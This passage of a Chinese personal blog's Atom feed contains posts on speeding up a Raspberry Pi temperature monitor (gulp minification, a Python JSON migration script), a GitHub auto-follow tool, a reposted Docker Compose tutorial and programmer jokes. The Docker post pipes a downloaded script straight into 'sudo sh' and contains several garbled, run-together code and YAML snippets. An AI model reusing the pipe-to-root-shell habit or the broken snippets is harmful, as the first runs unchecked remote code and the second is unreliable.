    <content type="html"><![CDATA[<p>树莓派这个项目已经过去了两月了，一直没有维护，直到我到了英国后发现，在英国连接北京的树莓派网速堪忧，只有100kb/s，每次想查看家里的温度情况，都要等待很长时间才能加载出来，有时候会丢包，这让我很不爽，于是我决定小小的优化一下。<br><a id="more"></a> </p>
<h1 id="优化css-js"><a href="#优化css-js" class="headerlink" title="优化css js"></a>优化css js</h1><p>之前写的css与js一直没有压缩，这次决定用gulp压缩一下</p>
<p>安装 <code>gulp</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install -g gulp</div></pre></td></tr></table></figure></p>
<p>安装 <code>gulp-uglify</code> 模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install gulp-uglify</div></pre></td></tr></table></figure></p>
<p>安装 <code>gulp-minify-css</code> 模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install gulp-minify-css</div></pre></td></tr></table></figure></p>
<p>压缩源：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">asset/dist/js</div><div class="line">asset/dist/css</div></pre></td></tr></table></figure></p>
<p>目标：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">asset/js</div><div class="line">asset/css</div></pre></td></tr></table></figure></p>
<p>好的 我们可以开始写<code>gulpfile.js</code>文件了<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 获取 gulp</span></div><div class="line"><span class="keyword">var</span> gulp = <span class="built_in">require</span>(<span class="string">'gulp'</span>)</div><div class="line"></div><div class="line"><span class="comment">// 获取 uglify 模块（用于压缩 JS）</span></div><div class="line"><span class="keyword">var</span> uglify = <span class="built_in">require</span>(<span class="string">'gulp-uglify'</span>)</div><div class="line"><span class="comment">// 获取 minify-css 模块（用于压缩 CSS）</span></div><div class="line"><span class="keyword">var</span> minifyCSS = <span class="built_in">require</span>(<span class="string">'gulp-minify-css'</span>)</div><div class="line"></div><div class="line"><span class="comment">// 压缩 js 文件</span></div><div class="line"><span class="comment">// 在命令行使用 gulp script 启动此任务</span></div><div class="line">gulp.task(<span class="string">'script'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="comment">// 1. 找到文件</span></div><div class="line">    gulp.src(<span class="string">'asset/dist/js/*.js'</span>)</div><div class="line">    <span class="comment">// 2. 压缩文件</span></div><div class="line">        .pipe(uglify())</div><div class="line">    <span class="comment">// 3. 另存压缩后的文件</span></div><div class="line">        .pipe(gulp.dest(<span class="string">'asset/js'</span>))</div><div class="line">&#125;)</div><div class="line"><span class="comment">// 压缩 css 文件</span></div><div class="line"><span class="comment">// 在命令行使用 gulp css 启动此任务</span></div><div class="line">gulp.task(<span class="string">'css'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="comment">// 1. 找到文件</span></div><div class="line">    gulp.src(<span class="string">'asset/dist/css/*.css'</span>)</div><div class="line">    <span class="comment">// 2. 压缩文件</span></div><div class="line">        .pipe(minifyCSS())</div><div class="line">    <span class="comment">// 3. 另存为压缩文件</span></div><div class="line">        .pipe(gulp.dest(<span class="string">'asset/css'</span>))</div><div class="line">&#125;)</div><div class="line"></div><div class="line"><span class="comment">// 在命令行使用 gulp auto 启动此任务</span></div><div class="line">gulp.task(<span class="string">'auto'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="comment">// 监听文件修改，当文件被修改则执行 script 任务</span></div><div class="line">    gulp.watch(<span class="string">'js/*.js'</span>, [<span class="string">'script'</span>])</div><div class="line">    gulp.watch(<span class="string">'css/*.css'</span>, [<span class="string">'css'</span>])</div><div class="line">&#125;)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// 使用 gulp.task('default') 定义默认任务</span></div><div class="line"><span class="comment">// 在命令行使用 gulp 启动 script 任务和 auto 任务</span></div><div class="line">gulp.task(<span class="string">'default'</span>, [<span class="string">'script'</span>, <span class="string">'css'</span> , <span class="string">'auto'</span>])</div></pre></td></tr></table></figure></p>
<p>执行gulp即可进行自动压缩及监听任务</p>
<h1 id="结构优化"><a href="#结构优化" class="headerlink" title="结构优化"></a>结构优化</h1><p>这是原有的结构</p>
<p>前端：Semantic UI + eCharts + JQuery Datapicker</p>
<p>数据： json(时间)</p>
<p>后端：Python + Apache</p>
<p>后端的python程序负责测温度和测湿度，并生成json数据，为了保证事实性，python程序一直在读写相同的json文件，每一分钟读写一次，造成了json文件的比较大，大概有68KB，在前端是通过ajax加载的json文件，如果网速很慢的话，必然会造成很长时间的延迟。</p>
<p>为了解决这个问题，首先第一步就是减小json文件大小。设计了一个解决方案是，以前的前端已经可以加载每小时数据和每分钟数据，不过小时和分钟的数据是通过在js中忽略加载实现的。</p>
<p>而现在采用新的方案，在data数据目录下，分别建立两个目录。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">data/min</div><div class="line">data/hour</div></pre></td></tr></table></figure>
<p>数据： json(min) / json(hour) </p>
<p>min的数据专门用于保存min,hour专门用于保存hour，为了解决旧数据迁移问题，首先先将内容移动到min目录下，在根目录下写了一个python小程序，执行挑选出hour数据并且迁移。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> string</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">jsonRead</span><span class="params">(path,topath,name)</span>:</span></div><div class="line">    pathfile = path + <span class="string">'/'</span> + name</div><div class="line">    topathfile = topath + <span class="string">'/'</span> + name</div><div class="line">    <span class="keyword">if</span> os.path.exists(pathfile):</div><div class="line">        file =open(pathfile,<span class="string">"r"</span>)</div><div class="line">        data = json.loads(file.read().decode(<span class="string">'utf-8'</span>))</div><div class="line">        i = <span class="number">1</span></div><div class="line">        jsonWrite(data[<span class="number">0</span>],topathfile)</div><div class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> data:</div><div class="line">            i = i + <span class="number">1</span></div><div class="line">            <span class="keyword">if</span>(i%<span class="number">60</span>==<span class="number">0</span>):</div><div class="line">                jsonWrite(v,topathfile)</div><div class="line">        file.close()</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'unable to open '</span> + pathfile + <span class="string">'file'</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">jsonWrite</span><span class="params">(data,pathfile)</span>:</span></div><div class="line">    <span class="keyword">if</span> os.path.exists(pathfile):</div><div class="line">      file =open(pathfile,<span class="string">"rb+"</span>)</div><div class="line">      file.seek(<span class="number">-1</span>,os.SEEK_END)</div><div class="line">      file.truncate()</div><div class="line">      file.write(<span class="string">","</span>)</div><div class="line">      json.dump(data,file)</div><div class="line">      file.write(<span class="string">"]"</span>)</div><div class="line">      file.close()</div><div class="line">      <span class="keyword">print</span> <span class="string">'succes: '</span>+ pathfile</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">      file =open(pathfile,<span class="string">"w"</span>)</div><div class="line">      file.write(<span class="string">"["</span>)</div><div class="line">      json.dump(data,file)</div><div class="line">      file.write(<span class="string">"]"</span>)</div><div class="line">      file.close()</div><div class="line"></div><div class="line">dir = <span class="string">'web/data/min'</span></div><div class="line">dist = <span class="string">'web/data/hour'</span></div><div class="line">files = os.listdir(dir)</div><div class="line"></div><div class="line"><span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(dir):</div><div class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> files:</div><div class="line">        jsonRead(dir,dist,name)</div></pre></td></tr></table></figure>
<p>与此同时也需要修改 前端js 与 后端python<br>具体代码在 <a href="https://github.com/yfgeek/rpi-TempRuntime/" target="_blank" rel="external">项目地址</a>，不贴了。</p>
<p>最后，经过优化，速度大概提升了5倍，前端获取的json文件为1KB。</p>
<p>后续还会增加季度数据统计，等待数据量大一点的时候方便做数据统计工作。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;树莓派这个项目已经过去了两月了，一直没有维护，直到我到了英国后发现，在英国连接北京的树莓派网速堪忧，只有100kb/s，每次想查看家里的温度情况，都要等待很长时间才能加载出来，有时候会丢包，这让我很不爽，于是我决定小小的优化一下。&lt;br&gt;
    
    </summary>
    
      <category term="Raspberry" scheme="http://blog.yfgeek.com/categories/Raspberry/"/>
    
    
      <category term="Raspberry" scheme="http://blog.yfgeek.com/tags/Raspberry/"/>
    
  </entry>
  
  <entry>
    <title>Github Follow 及 BaiduBlogTransfer 项目</title>
    <link href="http://blog.yfgeek.com/2016/11/08/Github%20Follow%20%E5%8F%8A%20BaiduBlogTransfer%20%E9%A1%B9%E7%9B%AE/"/>
    <id>http://blog.yfgeek.com/2016/11/08/Github Follow 及 BaiduBlogTransfer 项目/</id>
    <published>2016-11-08T01:24:35.000Z</published>
    <updated>2016-11-19T12:09:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近总是有莫名其妙的人关注我的Github，于是乎突发奇想，做了一个Github批量跟随的Python小程序。</p>
<p>用Python做这种事情最过瘾，Python短小、精炼、库多，非常好用，用了不到2个小时就把整个小程序完成了。<br><a id="more"></a><br>项目地址：</p>
<p><a href="https://github.com/yfgeek/AutoGithub" target="_blank" rel="external">点击进入项目</a></p>
<p>除此之外，我还整理了只去百度空间的Blogs放到了Github封存。</p>
<p><a href="https://github.com/yfgeek/Blog" target="_blank" rel="external">https://github.com/yfgeek/Blog</a></p>
<p>目录是用一个python小程序自动生成的，通过修改@cheezer的BaiduBlogTransfer项目的代码，添加了生成Markdown功能，把原来百度空间的内容全部导出来了。</p>
<p><a href="https://github.com/yfgeek/BaiduBlogTransferer" target="_blank" rel="external">点击进入项目</a></p>
<p>百度空间是我最早的Blog(2007-2011)，小学初中，后转战独立空间VPS，先后用过Worldpress,Ghost以及现在的Hexo。</p>
<p>百度空间有着很多的回忆，和百度斗智斗勇玩import js的eDIKID.CSS是美好的回忆❤️。</p>
<p>百度空间被百度关闭了，文章也没有了。</p>
<p>百度空间为我在初中高中时的玩具，部分内容掺杂当时网络用语，而且现在看来相当多的文章打脸，请不要用现在的眼光和视野去看过去的文章，在那个时候没有现在的思想和技术，所以文章内容过于幼稚。</p>
<p>❤️:3Mac</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近总是有莫名其妙的人关注我的Github，于是乎突发奇想，做了一个Github批量跟随的Python小程序。&lt;/p&gt;
&lt;p&gt;用Python做这种事情最过瘾，Python短小、精炼、库多，非常好用，用了不到2个小时就把整个小程序完成了。&lt;br&gt;
    
    </summary>
    
      <category term="github" scheme="http://blog.yfgeek.com/categories/github/"/>
    
    
      <category term="github" scheme="http://blog.yfgeek.com/tags/github/"/>
    
  </entry>
  
  <entry>
    <title>Docker Compose—简化复杂应用的利器 </title>
    <link href="http://blog.yfgeek.com/2016/10/15/Docker-Compose%E2%80%94%E7%AE%80%E5%8C%96%E5%A4%8D%E6%9D%82%E5%BA%94%E7%94%A8%E7%9A%84%E5%88%A9%E5%99%A8/"/>
    <id>http://blog.yfgeek.com/2016/10/15/Docker-Compose—简化复杂应用的利器/</id>
    <published>2016-10-15T18:10:35.000Z</published>
    <updated>2016-12-22T01:16:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>Compose是用于定义和运行复杂Docker应用的工具。你可以在一个文件中定义一个多容器的应用，然后使用一条命令来启动你的应用，然后所有相关的操作都会被自动完成。<br><a id="more"></a> </p>
<h2 id="1-安装Docker和Compose"><a href="#1-安装Docker和Compose" class="headerlink" title="1. 安装Docker和Compose"></a>1. 安装Docker和Compose</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 当前最新的Docker是1.6.2，Compose为1.2.0</span></div><div class="line">curl <span class="_">-s</span> https://get.docker.io/ubuntu/ | sudo sh</div><div class="line">sudo apt-get update</div><div class="line">sudo apt-get install lxc-docker</div><div class="line"><span class="comment"># 参考http://docs.docker.com/compose/install/#install-compose</span></div><div class="line">curl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-`uname <span class="_">-s</span>`-`uname -m` &amp;gt; /usr/<span class="built_in">local</span>/bin/docker-compose</div><div class="line">chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</div></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">### 上面这个方法真的慢出翔，可以通过Python pip安装。</span></div><div class="line"></div><div class="line">apt-get install python-pip python-dev</div><div class="line">pip install -U docker-compose</div></pre></td></tr></table></figure>
<p>当前最新的Docker是1.6.2，Compose为1.2.0<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo apt-get update</div><div class="line">sudo apt-get install lxc-docker</div></pre></td></tr></table></figure></p>
<p>参考 <a href="http://docs.docker.com/compose/install/#install-compose" target="_blank" rel="external">http://docs.docker.com/compose/install/#install-compose</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">curl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-uname <span class="_">-s</span>-uname -m &gt; /usr/<span class="built_in">local</span>/bin/docker-compose curl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-uname <span class="_">-s</span>-uname -m &gt; /usr/<span class="built_in">local</span>/bin/docker-compose</div><div class="line"></div><div class="line">chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</div><div class="line"><span class="comment">### 上面这个方法真的慢出翔，可以通过Python pip安装。</span></div><div class="line">apt-get install python-pip python-dev</div><div class="line">pip install -U docker-compose</div></pre></td></tr></table></figure></p>
<p>这样compose就安装好了，查看一下compose的版本信息：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</div><div class="line">docker-compose -version</div><div class="line">docker-compose 1.2.0</div></pre></td></tr></table></figure>
<h2 id="2-使用Compose"><a href="#2-使用Compose" class="headerlink" title="2. 使用Compose"></a>2. 使用Compose</h2><p>使用Compose只需要简单的三个步骤：</p>
<p>首先，使用Dockerfile来定义你的应用环境：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">FROM python:2.7</div><div class="line">ADD ./code</div><div class="line">WORKDIR /code</div><div class="line">RUN pip install -r requirements.txt</div></pre></td></tr></table></figure></p>
<p>其中，requirements.txt中的内容包括：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">flask</div><div class="line">redis</div></pre></td></tr></table></figure>
<p>再用Python写一个简单的app.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> flask importFlaskfrom redis importRedisimport os</div><div class="line">app =Flask(__name__)</div><div class="line">redis =Redis(host=<span class="string">'redis'</span>, port=<span class="number">6379</span>)@app.route(<span class="string">'/'</span>)<span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></div><div class="line">    redis.incr(<span class="string">'hits'</span>)<span class="keyword">return</span><span class="string">'Hello World! I have been seen %s times.'</span>% redis.get(<span class="string">'hits'</span>)<span class="keyword">if</span> __name__ ==<span class="string">"__main__"</span>:</div><div class="line">    app.run(host=<span class="string">"0.0.0.0"</span>, debug=<span class="keyword">True</span>)</div></pre></td></tr></table></figure></p>
<p>第二步，用一个compose.yaml来定义你的应用服务，他们可以把不同的服务生成不同的容器中组成你的应用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">web:</div><div class="line">  build:.</div><div class="line">  <span class="built_in">command</span>: python app.py</div><div class="line">  ports:</div><div class="line">         - <span class="string">"5000:5000"</span></div><div class="line">  volumes:</div><div class="line">         - .:/code</div><div class="line">  links:</div><div class="line">         - redis</div><div class="line">redis:</div><div class="line">  image: redis</div></pre></td></tr></table></figure></p>
<p>第三步，执行<code>docker-compose up</code>来启动你的应用，它会根据compose.yaml的设置来pull/run这俩个容器，然后再启动。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">Creating myapp_redis_1...</div><div class="line">Creating myapp_web_1...</div><div class="line">Building web...</div><div class="line">Step 0 : FROM python:2.7</div><div class="line">2.7: Pulling from python</div><div class="line">...</div><div class="line">Status: Downloaded newer image <span class="keyword">for</span> python:2.7</div><div class="line"> ---&gt; d833e0b23482</div><div class="line">Step 1 : ADD . /code</div><div class="line"> ---&gt; 1c04b1b15808</div><div class="line">Removing intermediate container 9dab91b4410d</div><div class="line">Step 2 : WORKDIR /code</div><div class="line"> ---&gt; Running <span class="keyword">in</span> f495a62feac9</div><div class="line"> ---&gt; ffea89a7b090</div><div class="line">Attaching to myapp_redis_1, myapp_web_1</div><div class="line">......</div><div class="line">redis_1 | [1] 17 May 10:42:38.147 * The server is now ready to accept connections on port 6379</div><div class="line">web_1   |  * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)</div><div class="line">web_1   |  * Restarting with <span class="built_in">stat</span></div></pre></td></tr></table></figure></p>
<h2 id="3-Yaml文件参考"><a href="#3-Yaml文件参考" class="headerlink" title="3. Yaml文件参考"></a>3. Yaml文件参考</h2><p>在上面的yaml文件中，我们可以看到compose文件的基本结构。首先是定义一个服务名，下面是yaml服务中的一些选项条目：</p>
<p>image:镜像的ID</p>
<p>build:直接从pwd的Dockerfile来build，而非通过image选项来pull</p>
<p>links：连接到那些容器。每个占一行，格式为SERVICE[:ALIAS],例如 – db[:database]</p>
<p>external_links：连接到该compose.yaml文件之外的容器中，比如是提供共享或者通用服务的容器服务。格式同links</p>
<p>command：替换默认的command命令</p>
<p>ports: 导出端口。格式可以是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ports:-&quot;3000&quot;-&quot;8000:8000&quot;-&quot;127.0.0.1:8001:8001&quot;</div></pre></td></tr></table></figure>
<p>expose：导出端口，但不映射到宿主机的端口上。它仅对links的容器开放。格式直接指定端口号即可。</p>
<p>volumes：加载路径作为卷，可以指定只读模式。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">volumes:-/var/lib/mysql</div><div class="line"> - cache/:/tmp/cache</div><div class="line"> -~/configs:/etc/configs/:ro</div></pre></td></tr></table></figure></p>
<p> volumes_from：加载其他容器或者服务的所有卷<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">environment:- RACK_ENV=development</div><div class="line">  - SESSION_SECRET</div></pre></td></tr></table></figure></p>
<p>env_file：从一个文件中导入环境变量，文件的格式为RACK_ENV=development</p>
<p>extends:扩展另一个服务，可以覆盖其中的一些选项。一个sample如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">common.yml</div><div class="line">webapp:</div><div class="line">  build:./webapp</div><div class="line">  environment:- DEBUG=false- SEND_EMAILS=false</div><div class="line">development.yml</div><div class="line">web:extends:</div><div class="line">    file: common.yml</div><div class="line">    service: webapp</div><div class="line">  ports:-&quot;8000:8000&quot;</div><div class="line">  links:- db</div><div class="line">  environment:- DEBUG=true</div><div class="line">db:</div><div class="line">  image: postgres</div></pre></td></tr></table></figure></p>
<p>net：容器的网络模式，可以为”bridge”, “none”, “container:[name or id]”, “host”中的一个。<br>dns：可以设置一个或多个自定义的DNS地址。</p>
<p>dns_search:可以设置一个或多个DNS的扫描域。</p>
<p>其他的working_dir, entrypoint, user, hostname, domainname, mem_limit, privileged, restart, stdin_open, tty, cpu_shares，和docker run命令是一样的，这些命令都是单行的命令。例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">cpu_shares:73</div><div class="line">working_dir:/code</div><div class="line">entrypoint: /code/entrypoint.sh</div><div class="line">user: postgresql</div><div class="line">hostname: foo</div><div class="line">domainname: foo.com</div><div class="line">mem_limit:1000000000</div><div class="line">privileged:true</div><div class="line">restart: always</div><div class="line">stdin_open:true</div><div class="line">tty:true</div></pre></td></tr></table></figure>
<h2 id="4-docker-compose常用命令"><a href="#4-docker-compose常用命令" class="headerlink" title="4. docker-compose常用命令"></a>4. docker-compose常用命令</h2><p>在第二节中的docker-compose up，这两个容器都是在前台运行的。我们可以指定-d命令以daemon的方式启动容器。除此之外，docker-compose还支持下面参数：</p>
<p>–verbose：输出详细信息</p>
<p>-f 制定一个非docker-compose.yml命名的yaml文件</p>
<p>-p 设置一个项目名称（默认是directory名）</p>
<p>docker-compose的动作包括：</p>
<p>build：构建服务</p>
<p>kill -s SIGINT：给服务发送特定的信号。</p>
<p>logs：输出日志</p>
<p>port：输出绑定的端口</p>
<p>ps：输出运行的容器</p>
<p>pull：pull服务的image</p>
<p>rm：删除停止的容器</p>
<p>run: 运行某个服务，例如docker-compose run web<br>python manage.py shell</p>
<p>start：运行某个服务中存在的容器。</p>
<p>stop:停止某个服务中存在的容器。</p>
<p>up：create + run + attach容器到服务。</p>
<p>scale：设置服务运行的容器数量。例如：docker-compose scale web=2 worker=3</p>
<blockquote>
<p>转载:<a href="http://debugo.com/docker-compose" target="_blank" rel="external">http://debugo.com/docker-compose</a></p>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Compose是用于定义和运行复杂Docker应用的工具。你可以在一个文件中定义一个多容器的应用，然后使用一条命令来启动你的应用，然后所有相关的操作都会被自动完成。&lt;br&gt;
    
    </summary>
    
      <category term="Docker" scheme="http://blog.yfgeek.com/categories/Docker/"/>
    
    
      <category term="Docker" scheme="http://blog.yfgeek.com/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>程序员鄙视链</title>
    <link href="http://blog.yfgeek.com/2016/10/12/%E7%A8%8B%E5%BA%8F%E5%91%98%E9%84%99%E8%A7%86%E9%93%BE/"/>
    <id>http://blog.yfgeek.com/2016/10/12/程序员鄙视链/</id>
    <published>2016-10-12T14:07:48.000Z</published>
    <updated>2016-11-19T12:08:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>纯粹的一些梗，比较搞笑。来源知乎和其他网站。<br><a id="more"></a> </p>
<h1 id="编辑器"><a href="#编辑器" class="headerlink" title="编辑器"></a>编辑器</h1><p>Emacs → Vim → Sublime → Word → Power Point<br>Vim →→ Emacs + evil插件<br>notepad++ → notepad<br>all → Source Insight → notepad</p>
<h1 id="语言"><a href="#语言" class="headerlink" title="语言"></a>语言</h1><p>asm → C ↔ C++ ↔ Java ↔ C# → JavaScript → VB → VBScript<br>Common Lisp ↔ Scheme → Emacs Lisp →→ Python<br>Python ↔ Perl → shell<br>PHP → all</p>
<h1 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h1><p>Unix → Linux → Windows → DOS<br>Solaris →→ 其他Unix<br><em>BSD ↔ System</em><br>OpenBSD ↔ FreeBSD → NetBSD<br>Arch → Debian<em> → Redhat</em><br>Debian → Ubuntu<br>Fedora → CentOS → RHEL<br>OSX → all</p>
<h1 id="IDE"><a href="#IDE" class="headerlink" title="IDE"></a>IDE</h1><p>Emacs + plugins ↔ Vim + plugins → 其他加插件的编辑器<br>IntelliJ → Eclipse → NetBeans<br>Code::Blocks → CodeLite<br>VS → all → Turbo C 2.0</p>
<h1 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h1><p><img src="/content/images/chain/1.jpg" alt=""></p>
<p><img src="/content/images/chain/2.jpg" alt=""></p>
<p><img src="/content/images/chain/3.jpg" alt=""></p>
<p><img src="/content/images/chain/4.jpg" alt=""></p>
<p><img src="/content/images/chain/5.jpg" alt=""></p>
<p><strong> 工具篇 </strong><br><img src="/content/images/chain/6.jpg" alt=""></p>
<p><img src="/content/images/chain/7.jpg" alt=""></p>
<p><img src="/content/images/chain/8.jpg" alt=""></p>
<p><img src="/content/images/chain/9.jpg" alt=""></p>
<p><strong> 系统软件篇 </strong></p>
<p><img src="/content/images/chain/10.jpg" alt=""></p>
<p><img src="/content/images/chain/11.jpg" alt=""></p>
<p><img src="/content/images/chain/12.jpg" alt=""></p>
<p><img src="/content/images/chain/13.jpg" alt=""></p>
<p><strong> 职场篇 </strong></p>
<p><img src="/content/images/chain/14.jpg" alt=""></p>
<p><img src="/content/images/chain/15.jpg" alt=""></p>
<p><img src="/content/images/chain/16.jpg" alt=""></p>
<p><img src="/content/images/chain/17.jpg" alt=""></p>
<blockquote>
<p>转载自：<a href="https://www.zhihu.com/question/24270600" target="_blank" rel="external">https://www.zhihu.com/question/24270600</a></p>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;纯粹的一些梗，比较搞笑。来源知乎和其他网站。&lt;br&gt;
    
    </summary>
    
      <category term="笑话" scheme="http://blog.yfgeek.com/categories/%E7%AC%91%E8%AF%9D/"/>
    
    
      <category term="笑话" scheme="http://blog.yfgeek.com/tags/%E7%AC%91%E8%AF%9D/"/>
    
  </entry>
  
</feed>
